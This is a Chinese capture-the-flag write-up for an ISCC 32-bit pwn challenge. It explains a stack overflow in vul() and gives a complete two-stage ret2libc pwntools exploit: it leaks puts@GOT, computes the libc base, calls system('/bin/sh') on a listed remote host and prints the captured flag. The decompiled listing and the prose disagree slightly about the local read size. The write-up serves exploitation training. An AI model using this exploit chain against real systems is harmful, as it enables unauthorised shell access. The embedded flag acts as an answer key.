# ISCC PWN - "Sometimes you need to step onto someone else's ground" Writeup

## 题目信息

- **题目地址**: `39.96.193.120:10002`
- **附件**: `attachment-27 (5)` — ELF 32-bit LSB executable, Intel 80386
- **Flag**: `ISCC{ad5e3007-82ff-456d-971a-82e84f3f31f4}`

## 基本分析

```
$ file attachment-27\ \(5\)
ELF 32-bit LSB executable, Intel 80386, dynamically linked, not stripped

$ checksec
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

反编译 `vul()` 函数：

```c
void vul() {
    char buf[0x50];       // ebp-0x50
    int canary = 0xdeadbeef; // ebp-0x10 (无实际作用)
    int zero = 0;            // ebp-0xc
    read(0, buf, 0x78);      // 溢出！buf只有0x50字节，但读入0x78字节
}
```

程序流程：`main() -> vul() -> read()`，存在明显的栈溢出。

## 关键发现：远程二进制与本地不同

通过泄露远程binary的代码段，发现**远程的 `read` 大小为 `0x78`（120字节），而非本地附件中的 `0x100`（256字节）**。

本地附件：
```asm
push   0x100         ; 68 00 01 00 00 (5字节)
```

远程实际：
```asm
push   0x78          ; 6a 78 (2字节)
```

这意味着：
- 我们只能发送 **120 字节** 的 payload
- 溢出到返回地址的偏移 = `0x50`(buf) + `4`(saved ebp) = **0x54 = 84 字节**
- 可用于 ROP chain 的空间 = `0x78 - 0x54` = **36 字节 = 9 个 dword**

## 漏洞利用思路

经典的 **ret2libc 两阶段攻击**：

1. **Stage 1**: 泄露 `puts` 的 GOT 地址 → 计算 libc 基址 → 返回 `vul` 等待第二次输入
2. **Stage 2**: 构造 `system("/bin/sh")` 的 ROP chain 获取 shell

## Libc 识别

通过泄露多个 GOT 表项的最后三位：

| 函数 | 末尾偏移 |
|------|----------|
| puts | 0x1e0 |
| read | 0x790 |
| setvbuf | 0x9c0 |
| __libc_start_main | 0xde0 |

通过 [libc.rip](https://libc.rip) 查询，确认为 **libc6-i386_2.31-0ubuntu9.17_amd64**：

| 符号 | 偏移 |
|------|------|
| puts | 0x6d1e0 |
| system | 0x41360 |
| "/bin/sh" | 0x18c363 |

## Exploit

```python
from pwn import *
import time

context.arch = 'i386'

elf = ELF('./attachment-27 (5)')

puts_plt = elf.plt['puts']       # 0x08049050
puts_got = elf.got['puts']       # 0x0804c010
vul      = elf.symbols['vul']    # 0x08049205

# libc 2.31 i386 Ubuntu 偏移
puts_off   = 0x6d1e0
system_off = 0x41360
binsh_off  = 0x18c363

# 远程 read 大小为 0x78，不是 0x100！
READ_SIZE = 0x78

p = remote('39.96.193.120', 10002)
p.recvline()  # banner

# ========== Stage 1: 泄露 puts 地址 ==========
payload = b'A' * 0x50          # 填充 buf
payload += b'BBBB'             # 覆盖 saved ebp
payload += p32(puts_plt)       # ret -> puts
payload += p32(vul)            # puts 返回后跳转到 vul（等待 stage 2）
payload += p32(puts_got)       # puts 的参数（泄露 puts@GOT）
payload = payload.ljust(READ_SIZE, b'\x00')

p.send(payload)

# 接收泄露的 puts 地址
leak = u32(p.recvn(4))
log.success(f'puts @ {hex(leak)}')

libc_base   = leak - puts_off
system_addr = libc_base + system_off
binsh_addr  = libc_base + binsh_off

log.success(f'libc base @ {hex(libc_base)}')
log.info(f'system @ {hex(system_addr)}')
log.info(f'/bin/sh @ {hex(binsh_addr)}')

# 清除 puts 的多余输出（GOT 连续非空项 + 换行）
try:
    p.recv(timeout=2)
except:
    pass

time.sleep(0.5)

# ========== Stage 2: 调用 system("/bin/sh") ==========
payload2 = b'A' * 0x50         # 填充 buf
payload2 += b'BBBB'            # 覆盖 saved ebp
payload2 += p32(system_addr)   # ret -> system
payload2 += p32(0xdeadbeef)    # system 的返回地址（无所谓）
payload2 += p32(binsh_addr)    # system 的参数："/bin/sh"
payload2 = payload2.ljust(READ_SIZE, b'\x00')

p.send(payload2)

# ========== 获得 Shell ==========
time.sleep(0.5)
p.sendline(b'cat /flag*')
print(p.recv(timeout=3).decode())
p.interactive()
```

## 运行结果

```
[+] puts @ 0xf7df61e0
[+] libc base @ 0xf7d89000
[*] system @ 0xf7dca360
[*] /bin/sh @ 0xf7f15363

ISCC{ad5e3007-82ff-456d-971a-82e84f3f31f4}
```

## 总结

| 考点 | 说明 |
|------|------|
| 栈溢出 | `read(0, buf, 0x78)` 溢出 0x50 字节的 buf |
| ret2libc | 泄露 GOT → 计算 libc 基址 → system("/bin/sh") |
| 远程差异 | 远程 binary 的 read 大小为 `0x78` 而非本地的 `0x100`，必须控制 payload 长度 |
| 两阶段利用 | Stage1 泄露 + Stage2 getshell |

**坑点**：附件中的 binary 与远程实际运行的有细微差别（`push 0x100` vs `push 0x78`），如果按本地分析发送 0x100 字节，多余的数据会被第二次 `read` 吞掉，导致 stage 2 永远无法正确送达。
